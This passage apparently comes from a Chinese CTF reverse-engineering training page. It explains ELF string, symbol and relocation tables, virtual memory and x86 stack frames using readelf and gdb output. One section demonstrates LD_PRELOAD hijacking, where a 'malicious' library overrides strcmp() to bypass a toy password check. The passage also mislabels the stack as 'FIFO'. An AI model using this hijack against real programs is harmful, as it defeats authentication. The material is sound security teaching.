null\u3000\u7ed3\u5c3e\u7684\u5b57\u7b26\u5e8f\u5217\u3002\u5bf9\u8c61\u6587\u4ef6\u4f7f\u7528\u8fd9\u4e9b\u5b57\u7b26\u4e32\u6765\u8868\u793a\u7b26\u53f7\u548c\u6bb5\u540d\u79f0\uff0c\u5f15\u7528\u5b57\u7b26\u4e32\u65f6\u53ea\u9700\u7ed9\u51fa\u5728\u8868\u4e2d\u7684\u504f\u79fb\u5373\u53ef\u3002\u5b57\u7b26\u4e32\u8868\u7684\u7b2c\u4e00\u4e2a\u5b57\u7b26\u548c\u6700\u540e\u4e00\u4e2a\u5b57\u7b26\u4e3a\u7a7a\u5b57\u7b26\uff0c\u4ee5\u786e\u4fdd\u6240\u6709\u5b57\u7b26\u4e32\u7684\u5f00\u59cb\u548c\u7ec8\u6b62\u3002\u901a\u5e38\u6bb5\u540d\u4e3a <code>.strtab</code> \u7684\u5b57\u7b26\u4e32\u8868\u662f \u5b57\u7b26\u4e32\u8868\uff08Strings Table\uff09\uff0c\u6bb5\u540d\u4e3a <code>.shstrtab</code> \u7684\u662f\u6bb5\u8868\u5b57\u7b26\u4e32\u8868\uff08Section Header String Table\uff09\u3002</p> \u504f\u79fb +0 +1 +2 +3 +4 +5 +6 +7 +8 +9 +0 \\0 h e l l o \\0 w o r +10 l d \\0 h e l l o w o +20 r l d \\0 \u504f\u79fb \u5b57\u7b26\u4e32 0 \u7a7a\u5b57\u7b26\u4e32 1 hello 7 world 13 helloworld 18 world <p>\u53ef\u4ee5\u4f7f\u7528 readelf \u8bfb\u53d6\u8fd9\u4e24\u4e2a\u8868\uff1a</p> <pre><code>$ readelf -x .strtab elfDemo.o\n\nHex dump of section '.strtab':\n  0x00000000 00656c66 44656d6f 2e63006c 6f63616c .elfDemo.c.local\n  0x00000010 5f737461 7469635f 696e6974 5f766172 _static_init_var\n  0x00000020 2e323139 35006c6f 63616c5f 73746174 .2195.local_stat\n  0x00000030 69635f75 6e696e69 745f7661 722e3231 ic_uninit_var.21\n  0x00000040 39360067 6c6f6261 6c5f696e 69745f76 96.global_init_v\n  0x00000050 61720067 6c6f6261 6c5f756e 696e6974 ar.global_uninit\n  0x00000060 5f766172 0066756e 63005f5f 7838362e _var.func.__x86.\n  0x00000070 6765745f 70635f74 68756e6b 2e617800 get_pc_thunk.ax.\n  0x00000080 5f474c4f 42414c5f 4f464653 45545f54 _GLOBAL_OFFSET_T\n  0x00000090 41424c45 5f007072 696e7466 006d6169 ABLE_.printf.mai\n  0x000000a0 6e00\n\n$ readelf -x .shstrtab elfDemo.o\n\nHex dump of section '.shstrtab':\n  0x00000000 002e7379 6d746162 002e7374 72746162 ..symtab..strtab\n  0x00000010 002e7368 73747274 6162002e 72656c2e ..shstrtab..rel.\n  0x00000020 74657874 002e6461 7461002e 62737300 text..data..bss.\n  0x00000030 2e726f64 61746100 2e746578 742e5f5f .rodata..text.__\n  0x00000040 7838362e 6765745f 70635f74 68756e6b x86.get_pc_thunk\n  0x00000050 2e617800 2e636f6d 6d656e74 002e6e6f .ax..comment..no\n  0x00000060 74652e47 4e552d73 7461636b 002e7265 te.GNU-stack..re\n  0x00000070 6c2e6568 5f667261 6d65002e 67726f75 l.eh_frame..grou\n  0x00000080 7000\n</code></pre>"},{"location":"Training/Material/Reverse/#_32","title":"\u7b26\u53f7\u8868","text":"<p>\u76ee\u6807\u6587\u4ef6\u7684\u7b26\u53f7\u8868\u4fdd\u5b58\u4e86\u5b9a\u4f4d\u548c\u91cd\u5b9a\u4f4d\u7a0b\u5e8f\u7684\u7b26\u53f7\u5b9a\u4e49\u548c\u5f15\u7528\u6240\u9700\u7684\u4fe1\u606f\u3002\u7b26\u53f7\u8868\u7d22\u5f15\u662f\u8fd9\u4e2a\u6570\u7ec4\u7684\u4e0b\u6807\u3002\u7d22\u5f15\uff10\u6307\u5411\u8868\u4e2d\u7684\u7b2c\u4e00\u4e2a\u6761\u76ee\uff0c\u4f5c\u4e3a\u672a\u5b9a\u4e49\u7684\u7b26\u53f7\u7d22\u5f15\u3002</p> <pre><code>typedef struct\n{\n  Elf32_Word    st_name;        /* Symbol name (string tbl index) */\n  Elf32_Addr    st_value;       /* Symbol value */\n  Elf32_Word    st_size;        /* Symbol size */\n  unsigned char st_info;        /* Symbol type and binding */\n  unsigned char st_other;       /* Symbol visibility */\n  Elf32_Section st_shndx;       /* Section index */\n} Elf32_Sym;\n\ntypedef struct\n{\n  Elf64_Word    st_name;        /* Symbol name (string tbl index) */\n  unsigned char st_info;        /* Symbol type and binding */\n  unsigned char st_other;       /* Symbol visibility */\n  Elf64_Section st_shndx;       /* Section index */\n  Elf64_Addr    st_value;       /* Symbol value */\n  Elf64_Xword   st_size;        /* Symbol size */\n} Elf64_Sym;\n</code></pre> <p>\u67e5\u770b\u7b26\u53f7\u8868\uff1a</p> <pre><code>$ readelf -s elfDemo.o\n\nSymbol table '.symtab' contains 20 entries:\n   Num:    Value  Size Type    Bind   Vis      Ndx Name\n     0: 00000000     0 NOTYPE  LOCAL  DEFAULT  UND\n     1: 00000000     0 FILE    LOCAL  DEFAULT  ABS elfDemo.c\n     2: 00000000     0 SECTION LOCAL  DEFAULT    2\n     3: 00000000     0 SECTION LOCAL  DEFAULT    4\n     4: 00000000     0 SECTION LOCAL  DEFAULT    5\n     5: 00000000     0 SECTION LOCAL  DEFAULT    6\n     6: 00000004     4 OBJECT  LOCAL  DEFAULT    4 local_static_init_var.219\n     7: 00000000     4 OBJECT  LOCAL  DEFAULT    5 local_static_uninit_var.2\n     8: 00000000     0 SECTION LOCAL  DEFAULT    7\n     9: 00000000     0 SECTION LOCAL  DEFAULT    9\n    10: 00000000     0 SECTION LOCAL  DEFAULT   10\n    11: 00000000     0 SECTION LOCAL  DEFAULT    8\n    12: 00000000     0 SECTION LOCAL  DEFAULT    1\n    13: 00000000     4 OBJECT  GLOBAL DEFAULT    4 global_init_var\n    14: 00000004     4 OBJECT  GLOBAL DEFAULT  COM global_uninit_var\n    15: 00000000    46 FUNC    GLOBAL DEFAULT    2 func\n    16: 00000000     0 FUNC    GLOBAL HIDDEN     7 __x86.get_pc_thunk.ax\n    17: 00000000     0 NOTYPE  GLOBAL DEFAULT  UND _GLOBAL_OFFSET_TABLE_\n    18: 00000000     0 NOTYPE  GLOBAL DEFAULT  UND printf\n    19: 0000002e    74 FUNC    GLOBAL DEFAULT    2 main\n</code></pre>"},{"location":"Training/Material/Reverse/#_33","title":"\u91cd\u5b9a\u4f4d","text":"<p>\u91cd\u5b9a\u4f4d\u662f\u8fde\u63a5\u7b26\u53f7\u5b9a\u4e49\u4e0e\u7b26\u53f7\u5f15\u7528\u7684\u8fc7\u7a0b\u3002\u53ef\u91cd\u5b9a\u4f4d\u6587\u4ef6\u5fc5\u987b\u5177\u6709\u63cf\u8ff0\u5982\u4f55\u4fee\u6539\u6bb5\u5185\u5bb9\u7684\u4fe1\u606f\uff0c\u4ece\u800c\u8fd0\u884c\u53ef\u6267\u884c\u6587\u4ef6\u548c\u5171\u4eab\u5bf9\u8c61\u6587\u4ef6\u4fdd\u5b58\u8fdb\u7a0b\u7a0b\u5e8f\u6620\u50cf\u7684\u6b63\u786e\u4fe1\u606f\u3002</p> <pre><code>typedef struct\n{\n  Elf32_Addr    r_offset;       /* Address */\n  Elf32_Word    r_info;         /* Relocation type and symbol index */\n} Elf32_Rel;\n\ntypedef struct\n{\n  Elf64_Addr    r_offset;       /* Address */\n  Elf64_Xword   r_info;         /* Relocation type and symbol index */\n  Elf64_Sxword  r_addend;       /* Addend */\n} Elf64_Rela;\n</code></pre> <p>\u67e5\u770b\u91cd\u5b9a\u4f4d\u8868\uff1a</p> <pre><code>$ readelf -r elfDemo.o\n\nRelocation section '.rel.text' at offset 0x338 contains 9 entries:\n Offset     Info    Type            Sym.Value  Sym. Name\n00000008  00001002 R_386_PC32        00000000   __x86.get_pc_thunk.ax\n0000000d  0000110a R_386_GOTPC       00000000   _GLOBAL_OFFSET_TABLE_\n00000019  00000509 R_386_GOTOFF      00000000   .rodata\n00000021  00001204 R_386_PLT32       00000000   printf\n00000040  00001002 R_386_PC32        00000000   __x86.get_pc_thunk.ax\n00000045  0000110a R_386_GOTPC       00000000   _GLOBAL_OFFSET_TABLE_\n00000052  00000d09 R_386_GOTOFF      00000000   global_init_var\n0000005d  00000309 R_386_GOTOFF      00000000   .data\n00000068  00000f02 R_386_PC32        00000000   func\n\nRelocation section '.rel.eh_frame' at offset 0x380 contains 3 entries:\n Offset     Info    Type            Sym.Value  Sym. Name\n00000020  00000202 R_386_PC32        00000000   .text\n00000044  00000202 R_386_PC32        00000000   .text\n00000070  00000802 R_386_PC32        00000000   .text.__x86.get_pc_thu\n</code></pre>"},{"location":"Training/Material/Reverse/#_34","title":"\u52a8\u6001\u94fe\u63a5","text":"<ul> <li>\u52a8\u6001\u94fe\u63a5\u76f8\u5173\u7684\u73af\u5883\u53d8\u91cf</li> </ul>"},{"location":"Training/Material/Reverse/#_35","title":"\u52a8\u6001\u94fe\u63a5\u76f8\u5173\u7684\u73af\u5883\u53d8\u91cf","text":""},{"location":"Training/Material/Reverse/#ld_preload","title":"LD_PRELOAD","text":"<p>LD_PRELOAD \u73af\u5883\u53d8\u91cf\u53ef\u4ee5\u5b9a\u4e49\u5728\u7a0b\u5e8f\u8fd0\u884c\u524d\u4f18\u5148\u52a0\u8f7d\u7684\u52a8\u6001\u94fe\u63a5\u5e93\u3002\u8fd9\u4f7f\u5f97\u6211\u4eec\u53ef\u4ee5\u6709\u9009\u62e9\u6027\u5730\u52a0\u8f7d\u4e0d\u540c\u52a8\u6001\u94fe\u63a5\u5e93\u4e2d\u7684\u76f8\u540c\u51fd\u6570\uff0c\u5373\u901a\u8fc7\u8bbe\u7f6e\u8be5\u53d8\u91cf\uff0c\u5728\u4e3b\u7a0b\u5e8f\u548c\u5176\u52a8\u6001\u94fe\u63a5\u5e93\u4e2d\u95f4\u52a0\u8f7d\u522b\u7684\u52a8\u6001\u94fe\u63a5\u5e93\uff0c\u751a\u81f3\u8986\u76d6\u539f\u672c\u7684\u5e93\u3002\u8fd9\u5c31\u6709\u53ef\u80fd\u51fa\u73b0\u52ab\u6301\u7a0b\u5e8f\u6267\u884c\u7684\u5b89\u5168\u95ee\u9898\u3002</p> <pre><code>#include&lt;stdio.h&gt;\n#include&lt;string.h&gt;\nvoid main() {\n    char passwd[] = \"password\";\n    char str[128];\n\n    scanf(\"%s\", &amp;str);\n    if (!strcmp(passwd, str)) {\n        printf(\"correct\\n\");\n        return;\n    }\n    printf(\"invalid\\n\");\n}\n</code></pre> <p>\u4e0b\u9762\u6211\u4eec\u6784\u9020\u4e00\u4e2a\u6076\u610f\u7684\u52a8\u6001\u94fe\u63a5\u5e93\u6765\u91cd\u8f7d <code>strcmp()</code> \u51fd\u6570\uff0c\u7f16\u8bd1\u4e3a\u52a8\u6001\u94fe\u63a5\u5e93\uff0c\u5e76\u8bbe\u7f6e LD_PRELOAD \u73af\u5883\u53d8\u91cf\uff1a</p> <pre><code>$ cat hack.c\n#include&lt;stdio.h&gt;\n#include&lt;stdio.h&gt;\nint strcmp(const char *s1, const char *s2) {\n    printf(\"hacked\\n\");\n    return 0;\n}\n$ gcc -shared -o hack.so hack.c\n$ gcc ldpreload.c\n$ ./a.out\nasdf\ninvalid\n$ LD_PRELOAD=\"./hack.so\" ./a.out\nasdf\nhacked\ncorrect\n</code></pre>"},{"location":"Training/Material/Reverse/#ld_show_auxv","title":"LD_SHOW_AUXV","text":"<p>AUXV \u662f\u5185\u6838\u5728\u6267\u884c ELF \u6587\u4ef6\u65f6\u4f20\u9012\u7ed9\u7528\u6237\u7a7a\u95f4\u7684\u4fe1\u606f\uff0c\u8bbe\u7f6e\u8be5\u73af\u5883\u53d8\u91cf\u53ef\u4ee5\u663e\u793a\u8fd9\u4e9b\u4fe1\u606f\u3002\u5982\uff1a</p> <pre><code>$ LD_SHOW_AUXV=1 ls\nAT_SYSINFO_EHDR: 0x7fff41fbc000\nAT_HWCAP:        bfebfbff\nAT_PAGESZ:       4096\nAT_CLKTCK:       100\nAT_PHDR:         0x55f1f623e040\nAT_PHENT:        56\nAT_PHNUM:        9\nAT_BASE:         0x7f277e1ec000\nAT_FLAGS:        0x0\nAT_ENTRY:        0x55f1f6243060\nAT_UID:          1000\nAT_EUID:         1000\nAT_GID:          1000\nAT_EGID:         1000\nAT_SECURE:       0\nAT_RANDOM:       0x7fff41effbb9\nAT_EXECFN:       /usr/bin/ls\nAT_PLATFORM:     x86_64\n</code></pre>"},{"location":"Training/Material/Reverse/#_36","title":"\u5185\u5b58\u7ba1\u7406","text":"<ul> <li>\u4ec0\u4e48\u662f\u5185\u5b58</li> <li>\u6808\u4e0e\u8c03\u7528\u7ea6\u5b9a</li> <li>\u5806\u4e0e\u5185\u5b58\u7ba1\u7406</li> </ul>"},{"location":"Training/Material/Reverse/#_37","title":"\u4ec0\u4e48\u662f\u5185\u5b58","text":"<p>\u4e3a\u4e86\u4f7f\u7528\u6237\u7a0b\u5e8f\u5728\u8fd0\u884c\u65f6\u5177\u6709\u4e00\u4e2a\u79c1\u6709\u7684\u5730\u5740\u7a7a\u95f4\u3001\u6709\u81ea\u5df1\u7684 CPU\uff0c\u5c31\u50cf\u72ec\u5360\u4e86\u6574\u4e2a\u8ba1\u7b97\u673a\u4e00\u6837\uff0c\u73b0\u4ee3\u64cd\u4f5c\u7cfb\u7edf\u63d0\u51fa\u4e86\u865a\u62df\u5185\u5b58\u7684\u6982\u5ff5\u3002</p> <p>\u865a\u62df\u5185\u5b58\u7684\u4e3b\u8981\u4f5c\u7528\u4e3b\u8981\u4e3a\u4e09\u4e2a\uff1a</p> <ul> <li>\u5b83\u5c06\u5185\u5b58\u770b\u505a\u4e00\u4e2a\u5b58\u50a8\u5728\u78c1\u76d8\u4e0a\u7684\u5730\u5740\u7a7a\u95f4\u7684\u9ad8\u901f\u7f13\u5b58\uff0c\u5728\u5185\u5b58\u4e2d\u53ea\u4fdd\u5b58\u6d3b\u52a8\u533a\u57df\uff0c\u5e76\u6839\u636e\u9700\u8981\u5728\u78c1\u76d8\u548c\u5185\u5b58\u4e4b\u95f4\u6765\u56de\u4f20\u9001\u6570\u636e\u3002</li> <li>\u5b83\u4e3a\u6bcf\u4e2a\u8fdb\u7a0b\u63d0\u4f9b\u4e86\u4e00\u81f4\u7684\u5730\u5740\u7a7a\u95f4\u3002</li> <li>\u5b83\u4fdd\u62a4\u4e86\u6bcf\u4e2a\u8fdb\u7a0b\u7684\u5730\u5740\u7a7a\u95f4\u4e0d\u88ab\u5176\u4ed6\u8fdb\u7a0b\u7834\u574f\u3002</li> </ul> <p>\u73b0\u4ee3\u64cd\u4f5c\u7cfb\u7edf\u91c7\u7528\u865a\u62df\u5bfb\u5740\u7684\u65b9\u5f0f\uff0cCPU \u901a\u8fc7\u751f\u6210\u4e00\u4e2a\u865a\u62df\u5730\u5740\uff08Virtual Address(VA)\uff09\u6765\u8bbf\u95ee\u5185\u5b58\uff0c\u7136\u540e\u8fd9\u4e2a\u865a\u62df\u5730\u5740\u901a\u8fc7\u5185\u5b58\u7ba1\u7406\u5355\u5143\uff08Memory Management Unit(MMU)\uff09\u8f6c\u6362\u6210\u7269\u7406\u5730\u5740\u4e4b\u540e\u88ab\u9001\u5230\u5b58\u50a8\u5668\u3002</p> <p></p> <p>\u524d\u9762\u6211\u4eec\u5df2\u7ecf\u770b\u5230\u53ef\u6267\u884c\u6587\u4ef6\u88ab\u6620\u5c04\u5230\u4e86\u5185\u5b58\u4e2d\uff0cLinux \u4e3a\u6bcf\u4e2a\u8fdb\u7a0b\u7ef4\u6301\u4e86\u4e00\u4e2a\u5355\u72ec\u7684\u865a\u62df\u5730\u5740\u7a7a\u95f4\uff0c\u5305\u62ec\u4e86 .text\u3001.data\u3001.bss\u3001\u6808\uff08stack\uff09\u3001\u5806\uff08heap\uff09\uff0c\u5171\u4eab\u5e93\u7b49\u5185\u5bb9\u3002</p> <p>32 \u4f4d\u7cfb\u7edf\u6709 4GB \u7684\u5730\u5740\u7a7a\u95f4\uff0c\u5176\u4e2d 0x08048000~0xbfffffff \u662f\u7528\u6237\u7a7a\u95f4\uff083GB\uff09\uff0c0xc0000000~0xffffffff \u662f\u5185\u6838\u7a7a\u95f4\uff08\uff11GB\uff09\u3002</p> <p></p>"},{"location":"Training/Material/Reverse/#_38","title":"\u6808\u4e0e\u8c03\u7528\u7ea6\u5b9a","text":""},{"location":"Training/Material/Reverse/#_39","title":"\u6808","text":"<p>\u6808\u662f\u4e00\u4e2a\u5148\u5165\u540e\u51fa\uff08First In Last Out(FIFO)\uff09\u7684\u5bb9\u5668\u3002\u7528\u4e8e\u5b58\u653e\u51fd\u6570\u8fd4\u56de\u5730\u5740\u53ca\u53c2\u6570\u3001\u4e34\u65f6\u53d8\u91cf\u548c\u6709\u5173\u4e0a\u4e0b\u6587\u7684\u5185\u5bb9\u3002\u7a0b\u5e8f\u5728\u8c03\u7528\u51fd\u6570\u65f6\uff0c\u64cd\u4f5c\u7cfb\u7edf\u4f1a\u81ea\u52a8\u901a\u8fc7\u538b\u6808\u548c\u5f39\u6808\u5b8c\u6210\u4fdd\u5b58\u51fd\u6570\u73b0\u573a\u7b49\u64cd\u4f5c\uff0c\u4e0d\u9700\u8981\u7a0b\u5e8f\u5458\u624b\u52a8\u5e72\u9884\u3002</p> <p>\u6808\u7531\u9ad8\u5730\u5740\u5411\u4f4e\u5730\u5740\u589e\u957f\uff0c\u6808\u4fdd\u5b58\u4e86\u4e00\u4e2a\u51fd\u6570\u8c03\u7528\u6240\u9700\u8981\u7684\u7ef4\u62a4\u4fe1\u606f\uff0c\u79f0\u4e3a\u5806\u6808\u5e27\uff08Stack Frame\uff09\u5728 x86 \u4f53\u7cfb\u4e2d\uff0c\u5bc4\u5b58\u5668 <code>ebp</code> \u6307\u5411\u5806\u6808\u5e27\u7684\u5e95\u90e8\uff0c<code>esp</code> \u6307\u5411\u5806\u6808\u5e27\u7684\u9876\u90e8\u3002\u538b\u6808\u65f6\u6808\u9876\u5730\u5740\u51cf\u5c0f\uff0c\u5f39\u6808\u65f6\u6808\u9876\u5730\u5740\u589e\u5927\u3002</p> <ul> <li><code>PUSH</code>\uff1a\u7528\u4e8e\u538b\u6808\u3002\u5c06 <code>esp</code> \u51cf 4\uff0c\u7136\u540e\u5c06\u5176\u552f\u4e00\u64cd\u4f5c\u6570\u7684\u5185\u5bb9\u5199\u5165\u5230 <code>esp</code> \u6307\u5411\u7684\u5185\u5b58\u5730\u5740</li> <li><code>POP</code> \uff1a\u7528\u4e8e\u5f39\u6808\u3002\u4ece <code>esp</code> \u6307\u5411\u7684\u5185\u5b58\u5730\u5740\u83b7\u5f97\u6570\u636e\uff0c\u5c06\u5176\u52a0\u8f7d\u5230\u6307\u4ee4\u64cd\u4f5c\u6570\uff08\u901a\u5e38\u662f\u4e00\u4e2a\u5bc4\u5b58\u5668\uff09\u4e2d\uff0c\u7136\u540e\u5c06 <code>esp</code> \u52a0 4\u3002</li> </ul> <p>x86 \u4f53\u7cfb\u4e0b\u51fd\u6570\u7684\u8c03\u7528\u603b\u662f\u8fd9\u6837\u7684\uff1a</p> <ul> <li>\u628a\u6240\u6709\u6216\u4e00\u90e8\u5206\u53c2\u6570\u538b\u5165\u6808\u4e2d\uff0c\u5982\u679c\u6709\u5176\u4ed6\u53c2\u6570\u6ca1\u6709\u5165\u6808\uff0c\u90a3\u4e48\u4f7f\u7528\u67d0\u4e9b\u7279\u5b9a\u7684\u5bc4\u5b58\u5668\u4f20\u9012\u3002</li> <li>\u628a\u5f53\u524d\u6307\u4ee4\u7684\u4e0b\u4e00\u6761\u6307\u4ee4\u7684\u5730\u5740\u538b\u5165\u6808\u4e2d\u3002</li> <li>\u8df3\u8f6c\u5230\u51fd\u6570\u4f53\u6267\u884c\u3002</li> </ul> <p>\u5176\u4e2d\u7b2c 2 \u6b65\u548c\u7b2c 3 \u6b65\u7531\u6307\u4ee4 <code>call</code> \u4e00\u8d77\u6267\u884c\u3002\u8df3\u8f6c\u5230\u51fd\u6570\u4f53\u4e4b\u540e\u5373\u5f00\u59cb\u6267\u884c\u51fd\u6570\uff0c\u800c x86 \u51fd\u6570\u4f53\u7684\u5f00\u5934\u662f\u8fd9\u6837\u7684\uff1a</p> <ul> <li><code>push ebp</code>\uff1a\u628aebp\u538b\u5165\u6808\u4e2d\uff08old ebp\uff09\u3002</li> <li><code>mov ebp, esp</code>\uff1aebp=esp\uff08\u8fd9\u65f6ebp\u6307\u5411\u6808\u9876\uff0c\u800c\u6b64\u65f6\u6808\u9876\u5c31\u662fold ebp\uff09</li> <li>[\u53ef\u9009] <code>sub esp, XXX</code>\uff1a\u5728\u6808\u4e0a\u5206\u914d XXX \u5b57\u8282\u7684\u4e34\u65f6\u7a7a\u95f4\u3002</li> <li>[\u53ef\u9009] <code>push XXX</code>\uff1a\u4fdd\u5b58\u540d\u4e3a XXX \u7684\u5bc4\u5b58\u5668\u3002</li> </ul> <p>\u628aebp\u538b\u5165\u6808\u4e2d\uff0c\u662f\u4e3a\u4e86\u5728\u51fd\u6570\u8fd4\u56de\u65f6\u6062\u590d\u4ee5\u524d\u7684ebp\u503c\uff0c\u800c\u538b\u5165\u5bc4\u5b58\u5668\u7684\u503c\uff0c\u662f\u4e3a\u4e86\u4fdd\u6301\u67d0\u4e9b\u5bc4\u5b58\u5668\u5728\u51fd\u6570\u8c03\u7528\u524d\u540e\u4fdd\u5b58\u4e0d\u53d8\u3002\u51fd\u6570\u8fd4\u56de\u65f6\u7684\u64cd\u4f5c\u4e0e\u5f00\u5934\u6b63\u597d\u76f8\u53cd\uff1a</p> <ul> <li>[\u53ef\u9009] <code>pop XXX</code>\uff1a\u6062\u590d\u4fdd\u5b58\u7684\u5bc4\u5b58\u5668\u3002</li> <li><code>mov esp, ebp</code>\uff1a\u6062\u590desp\u540c\u65f6\u56de\u6536\u5c40\u90e8\u53d8\u91cf\u7a7a\u95f4\u3002</li> <li><code>pop ebp</code>\uff1a\u6062\u590d\u4fdd\u5b58\u7684ebp\u7684\u503c\u3002</li> <li><code>ret</code>\uff1a\u4ece\u6808\u4e2d\u53d6\u5f97\u8fd4\u56de\u5730\u5740\uff0c\u5e76\u8df3\u8f6c\u5230\u8be5\u4f4d\u7f6e\u3002</li> </ul> <p>\u6808\u5e27\u5bf9\u5e94\u7684\u6c47\u7f16\u4ee3\u7801\uff1a</p> <pre><code>PUSH ebp        ; \u51fd\u6570\u5f00\u59cb\uff08\u4f7f\u7528ebp\u524d\u5148\u628a\u5df2\u6709\u503c\u4fdd\u5b58\u5230\u6808\u4e2d\uff09\nMOV ebp, esp    ; \u4fdd\u5b58\u5f53\u524desp\u5230ebp\u4e2d\n\n...             ; \u51fd\u6570\u4f53\n                ; \u65e0\u8bbaesp\u503c\u5982\u4f55\u53d8\u5316\uff0cebp\u90fd\u4fdd\u6301\u4e0d\u53d8\uff0c\u53ef\u4ee5\u5b89\u5168\u8bbf\u95ee\u51fd\u6570\u7684\u5c40\u90e8\u53d8\u91cf\u3001\u53c2\u6570\nMOV esp, ebp    ; \u5c06\u51fd\u6570\u7684\u5176\u5b9e\u5730\u5740\u8fd4\u56de\u5230esp\u4e2d\nPOP ebp         ; \u51fd\u6570\u8fd4\u56de\u524d\u5f39\u51fa\u4fdd\u5b58\u5728\u6808\u4e2d\u7684ebp\u503c\nRET             ; \u51fd\u6570\u8fd4\u56de\u5e76\u8df3\u8f6c\n</code></pre> <p>\u51fd\u6570\u8c03\u7528\u540e\u6808\u7684\u6807\u51c6\u5e03\u5c40\u5982\u4e0b\u56fe\uff1a</p> <p></p> <p>\u6211\u4eec\u6765\u770b\u4e00\u4e2a\u4f8b\u5b50\uff1a\u6e90\u7801</p> <pre><code>#include&lt;stdio.h&gt;\nint add(int a, int b) {\n    int x = a, y = b;\n    return (x + y);\n}\n\nint main() {\n    int a = 1, b = 2;\n    printf(\"%d\\n\", add(a, b));\n    return 0;\n}\n</code></pre> <p>\u4f7f\u7528 gdb \u67e5\u770b\u5bf9\u5e94\u7684\u6c47\u7f16\u4ee3\u7801\uff0c\u8fd9\u91cc\u6211\u4eec\u7ed9\u51fa\u4e86\u8be6\u7ec6\u7684\u6ce8\u91ca\uff1a</p> <pre><code>gdb-peda$ disassemble main\nDump of assembler code for function main:\n   0x00000563 &lt;+0&gt;: lea    ecx,[esp+0x4]                      ;\u5c06 esp+0x4 \u7684\u5730\u5740\u4f20\u7ed9 ecx\n   0x00000567 &lt;+4&gt;: and    esp,0xfffffff0                     ;\u6808 16 \u5b57\u8282\u5bf9\u9f50\n   0x0000056a &lt;+7&gt;: push   DWORD PTR [ecx-0x4]                ;ecx-0x4\uff0c\u5373\u539f esp \u5f3a\u5236\u8f6c\u6362\u4e3a\u53cc\u5b57\u6570\u636e\u540e\u538b\u5165\u6808\u4e2d\n   0x0000056d &lt;+10&gt;:    push   ebp                              ;\u4fdd\u5b58\u8c03\u7528 main() \u51fd\u6570\u4e4b\u524d\u7684 ebp\uff0c\u7531\u4e8e\u5728 _start \u4e2d\u5c06 ebp \u6e05\u96f6\u4e86\uff0c\u8fd9\u91cc\u7684 ebp=0x0\n   0x0000056e &lt;+11&gt;:    mov    ebp,esp                          ;\u628a\u8c03\u7528 main() \u4e4b\u524d\u7684 esp \u4f5c\u4e3a\u5f53\u524d\u6808\u5e27\u7684 ebp\n   0x00000570 &lt;+13&gt;:    push   ebx                              ;ebx\u3001ecx \u5165\u6808\n   0x00000571 &lt;+14&gt;:    push   ecx\n   0x00000572 &lt;+15&gt;:    sub    esp,0x10                         ;\u4e3a\u5c40\u90e8\u53d8\u91cf a\u3001b \u5206\u914d\u7a7a\u95f4\u5e76\u505a\u5230 16 \u5b57\u8282\u5bf9\u9f50\n   0x00000575 &lt;+18&gt;:    call   0x440 &lt;__x86.get_pc_thunk.bx&gt;    ;\u8c03\u7528 &lt;__x86.get_pc_thunk.bx&gt; \u51fd\u6570\uff0c\u5c06 esp \u5f3a\u5236\u8f6c\u6362\u4e3a\u53cc\u5b57\u6570\u636e\u540e\u4fdd\u5b58\u5230 ebx\n   0x0000057a &lt;+23&gt;:    add    ebx,0x1a86                       ;ebx+0x1a86\n   0x00000580 &lt;+29&gt;:    mov    DWORD PTR [ebp-0x10],0x1         ;a \u7b2c\u4e8c\u4e2a\u5165\u6808\u6240\u4ee5\u4fdd\u5b58\u5728 ebp-0x10 \u7684\u4f4d\u7f6e\uff0c\u6b64\u53e5\u5373 a=1\n   0x00000587 &lt;+36&gt;:    mov    DWORD PTR [ebp-0xc],0x2          ;b \u7b2c\u4e00\u4e2a\u5165\u6808\u6240\u4ee5\u4fdd\u5b58\u5728 ebp-0xc \u7684\u4f4d\u7f6e\uff0c\u6b64\u53e5\u5373 b=2\n   0x0000058e &lt;+43&gt;:    push   DWORD PTR [ebp-0xc]              ;\u5c06 b \u538b\u5165\u6808\u4e2d\n   0x00000591 &lt;+46&gt;:    push   DWORD PTR [ebp-0x10]             ;\u5c06 a \u538b\u5165\u6808\u4e2d\n   0x00000594 &lt;+49&gt;:    call   0x53d &lt;add&gt;                      ;\u8c03\u7528 add() \u51fd\u6570\uff0c\u8fd4\u56de\u503c\u4fdd\u5b58\u5728 eax \u4e2d\n   0x00000599 &lt;+54&gt;:    add    esp,0x8                          ;\u6e05\u7406 add() \u7684\u53c2\u6570\n   0x0000059c &lt;+57&gt;:    sub    esp,0x8                          ;\u8c03\u6574 esp \u4f7f 16 \u4f4d\u5bf9\u9f50\n   0x0000059f &lt;+60&gt;:    push   eax                              ;eax \u5165\u6808\n   0x000005a0 &lt;+61&gt;:    lea    eax,[ebx-0x19b0]                 ;ebx-0x19b0 \u7684\u5730\u5740\u4fdd\u5b58\u5230 eax\uff0c\u8be5\u5730\u5740\u5904\u4fdd\u5b58\u5b57\u7b26\u4e32 \"%d\\n\"\n   0x000005a6 &lt;+67&gt;:    push   eax                              ;eax \u5165\u6808\n   0x000005a7 &lt;+68&gt;:    call   0x3d0 &lt;printf@plt&gt;               ;\u8c03\u7528 printf() \u51fd\u6570\n   0x000005ac &lt;+73&gt;:    add    esp,0x10                         ;\u8c03\u6574\u6808\u9876\u6307\u9488 esp\uff0c\u6e05\u7406 printf() \u7684\u53c2\u6570\n   0x000005af &lt;+76&gt;:    mov    eax,0x0                          ;eax=0x0\n   0x000005b4 &lt;+81&gt;:    lea    esp,[ebp-0x8]                    ;ebp-0x8 \u7684\u5730\u5740\u4fdd\u5b58\u5230 esp\n   0x000005b7 &lt;+84&gt;:    pop    ecx                              ;\u5f39\u6808\u6062\u590d ecx\u3001ebx\u3001ebp\n   0x000005b8 &lt;+85&gt;:    pop    ebx\n   0x000005b9 &lt;+86&gt;:    pop    ebp\n   0x000005ba &lt;+87&gt;:    lea    esp,[ecx-0x4]                    ;ecx-0x4 \u7684\u5730\u5740\u4fdd\u5b58\u5230 esp\n   0x000005bd &lt;+90&gt;:    ret                                     ;\u8fd4\u56de\uff0c\u76f8\u5f53\u4e8e pop eip;\nEnd of assembler dump.\ngdb-peda$ disassemble add\nDump of assembler code for function add:\n   0x0000053d &lt;+0&gt;: push   ebp                                ;\u4fdd\u5b58\u8c03\u7528 add() \u51fd\u6570\u4e4b\u524d\u7684 ebp\n   0x0000053e &lt;+1&gt;: mov    ebp,esp                            ;\u628a\u8c03\u7528 add() \u4e4b\u524d\u7684 esp \u4f5c\u4e3a\u5f53\u524d\u6808\u5e27\u7684 ebp\n   0x00000540 &lt;+3&gt;: sub    esp,0x10                           ;\u4e3a\u5c40\u90e8\u53d8\u91cf x\u3001y 